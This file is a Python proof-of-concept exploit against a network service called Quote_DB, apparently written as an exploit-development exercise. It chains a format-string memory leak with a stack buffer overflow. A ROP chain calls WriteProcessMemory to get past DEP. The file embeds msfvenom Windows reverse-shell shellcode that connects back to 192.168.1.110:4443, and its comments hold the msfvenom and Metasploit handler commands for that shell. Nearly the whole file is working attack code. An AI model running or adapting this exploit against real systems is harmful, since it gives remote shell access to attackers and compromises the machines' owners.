#!/usr/bin/python3

# Quote_DB PoC
# William Moody, 07.06.2021

from functools import update_wrapper
import socket
import sys
from struct import pack, unpack

if len(sys.argv) != 2:
    print("Usage: %s server" % sys.argv[0])
    sys.exit(1)

server = sys.argv[1]
port = 3700

# ===

def send(opcode, data):
    buf  = pack("<I", opcode)
    buf += data

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    
    try:
        ret = s.recv(16384)
        s.close()

        return ret
    except:
        return None

# ===

def get_quote(index):
    return send(901, pack("<I", index))

def add_quote(quote):
    return send(902, quote)

def bad_request(buf):
    return send(800, buf)

# ===

print("[+] Getting base address...")

quote_id = unpack("<I", add_quote(b"%x " * 30))[0]
base_str = get_quote(quote_id).split(b" ")[2].decode()
base = (int(base_str, 16) // 0x10000) * 0x10000

print("    -- " + hex(base))

# ===

size = 5000
ropSize = 500

# ===

# Bad Characters
# = 0x00 0x0a 0x20 0x28 0x80 0x81 0x86

# Reverse Shell
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.110LPORT=4443 -b "\x00\x0a\x20\x80\x81\x86" EXITFUNC=thread -f python -v shellcode
# msfconsole -q -x "use exploit/multi/handler; set PAYLOAD payload/windows/shell_reverse_tcp; set LHOST 192.168.1.110; set lport 4443; exploit"

shellcode = b'\x89\xe5\x81\xc4\xf0\xf9\xff\xff\xeb\x06^\x89u\x04\xebP\xe8\xf5\xff\xff\xff`1\xc9d\x8bq0\x8bv\x0c\x8bv\x1cV\x8b^\x08\x0f\xb6F\x1e\x89E\xf8\x8bC<\x8b|\x03x\x01\xdf\x8bO\x18O\x8bG!G\x01\xd8\x89E\xfc\xe3\x1dI\x8bE\xfc\x8b4\x88\x01\xde1\xc0\x8bU\xf8\xfc\xac\x84\xc0t\x0e\xc1\xca\x05\x01\xc2\xeb\xf4\xeb+^\x8b6\xeb\xbb;T$(u\xd6\x8bW$\x01\xdaf\x8b\x0cJ\x8bW\x1c\x01\xda\x8b\x04\x8a\x01\xd8L\x89D$!D^aYZQ\xff\xe0\xb8\xb4\xb3\xff\xfe\xf7\xd8Ph32.DhWS2_Th\x92\xacm\xcc\xffU\x04\x89\xe01\xc9f\xb9\x90\x05)\xc8P1\xc0f\xb8\x02\x02Ph\xc8\xcb\xa7;\xffU\x041\xc0PPP\xb0\x06P,\x05P@Ph\x19\xe9\xd9/\xffU\x04\x89\xc61\xc0PPh\xc0\xa8\x01nf\xb8\x11[\xc1\xe0\x10f\x83\xc0\x02PT_1\xc0PPPP\x04\x10PWVh\x0b\x99\xe0\xa7\xffU\x04VVV1\xc0\x8dH\rP\xe2\xfd\xb0DPT_f\xc7G,\x01\x01\xb8\x9b\x87\x9a\xff\xf7\xd8Phcmd.\x89\xe3\x89\xe01\xc9f\xb9\x90\x03)\xc8PW1\xc0PPP@PHPPSPh\xd9zI\x06\xffU\x041\xc9Qj\xffh\xce\x83\xcbg\xffU\x04'

# ===

rop = [
# 1. Get ESP (in eax)
    0x402ac9,       # xor eax, eax ; ret
                    # Sets EAX to 0

    0x401fd6,       # or eax, esp ; ret
                    # Sets EAX to the value of ESP

                    # Results: EAX contains the value of stack pointer (ESP)

# 2. Get dummy call addr (in ebx)
    0x4040f3,       # pop ecx ; ret
                    # EAX has the value of saved ESP.
    0x1ec,          # EAX(ESP) + 0x1ec = skeleton value 'aaaa'
                    # 'aaaa' = 0x010d78cc  (0x61616161)


    0x40eb7d,       # mov edx, eax ; mov edx, eax ; ret
                    # Moves EAX(ESP) to EDX.
                    # Reason: To add ECX to EDX to manipulate saved ESP

    0x401ff3,       # add edx, ecx ; ret
    0x402ce8,       # mov eax, edx
                    # Return saved ESP in EDX to EAX

    0x401fe0,       # mov ebx, eax ; ret
                    # Saved ESP is now in EBX also.

# 3. Deref WriteProcessMemory (in eax)
    0x4030d7,       # pop eax ; pop ecx ; ret
                    # Place VirtualAlloc into EAX
    0x0044a1fc,       # base + iat + WriteProcessMemory = 0x77932510 KERNEL32!WriteProcessMemoryStub
    0xffffffff,     # junk for pop ecx

    0x410515,       # mov eax, [eax] ; ret
                    # Derefernces the address in EAX to get the actual function pointer
                    # of WriteProcessMemory.

                    # Before instruction: EAX contains 0x0044a1e8
                    # During instruction: CPU reads the value within 0x0044a1e8
                    # After  instruction: The value 0x75ac81b0 (KERNEL32!WriteProcessMemoryStub)
                    #                     is moved into the EAX register.

# 4. 0x61616161 Write WriteProcessMemory to dummy + 0x0
    0x401fe7,       # mov [ebx], eax ; ret
                    # Move WriteProcessMemory Pointer into EBX. (Skeleton location 0x61616161)

# 5. Get shellcode addr (in eax)
    0x4040f3,       # pop ecx ; ret
    0x1c,           # hex(28)

    0x401ff3,       # add edx, ecx ; ret
                    # Adds 0x18 to EDX (which contains original skeleton call)
                    # EDX now points to shellcode address parameter

    0x402ce8,       # mov eax, edx
                    # EDX moves shellcode address parameter address to EAX

                    # Result: EAX contains the address of the shellcode
                    #         EBX points to skeleton call address. (0x61616161 = 0x75ac81b0)


# 6. 0x62626262 Get dummy call addr + 0x4 (in ebx) Ret parameter

                    # Result: EBX is on skeleton call + 4 (0x62626262)

# 7. Write shellcode addr to dummy + 0x4 Ret parameter
#    0x401fe7,       # mov [ebx], eax ; ret
                    # Results: Shellcode is written to 0x62626262

# 8. 0x64646464 Get dummy call addr + 0x10 (in ebx)
    0x401fef,       # add ebx, 0x4 ; ret
    0x401fef,       # add ebx, 0x4 ; ret
    0x401fef,       # add ebx, 0x4 ; ret
    0x401fef,       # add ebx, 0x4 ; ret
                    # Results: EBX is on skeleton call + 0x10 (0x64646464)
                    #          Skipped 12 bytes because:
                    #          Ret Shellcode is done
                    #          hProcess is done (0xffffffff)
                    #          lpBaseAddress is done (0x00491d10)
                    #          (NO ASLR in main_dep_wpm.exe module)

# 9. Get dummy call addr + 0x10 (in ebx)
    0x401fe7,       # mov [ebx], eax
                    # 0x011678e8 Shellcode Stack Address (src)

# 10. 0x64646464 Get skeleton call addr + 0x14
    0x401fef,       # add ebx, 0x4 ; ret
    0x401fef,       # add ebx, 0x4 ; ret
                    # Results: EBX is on skeleton call + 0x14 (0x66666666)


                    # All Skeleton values completed
                    # End   of ROP 1
                    # Start of ROP 2
                    # ROP 2 will encode the shellcode to replace bad characters
                    # bad characters: 0x00 0x0a 0x20 0x28 0x80 0x81 0x86


# 11. Align esp with dummy call (ebx-8)
    0x4040f3,       # pop ecx
    0xffffffe4,     # 0xffffffe4    = -0x1c (-28)
    0x401ff3,       # add edx, ecx  = edx - 0x24
    0x402ce8,       # mov eax, edx
    0x401fe0,       # mov ebx, eax
    0x401fe3,       # xchg ebx, esp ; dec ecx ; ret

                    # Results: Return SAVED ESP from EAX to CURRENT ESP

]
rop = b"".join([pack("<I", r) for r in rop])

# ===

dummy  = b"aaaa"                # WriteProcessMemory     <- The Call
dummy += pack("<I", 0x00410640) # Ret                    <- Ret2Code_Cave
dummy += pack("<I", 0xffffffff) # hProcess               <- (-0x1 Current Process)
dummy += pack("<I", 0x00410640) # lpBaseAddress          <- Code Cave Address (dst)
dummy += b"dddd"                # lpBuffer               <- Shellcode (STACK) (src)
dummy += pack("<I", 0x190)      # nSize                  <- Size of Shellcode
dummy += pack("<I", 0x00423010) # lpNumberofBytesWritten <- Some writable address

# ===

buf  = b"A" * 2060
buf += rop                      # Setup WriteProcessMemory paramters
buf += b"C" * (ropSize - len(rop))
buf += dummy
buf += shellcode

# ===

print("[+] Triggering overflow...")

bad_request(buf)
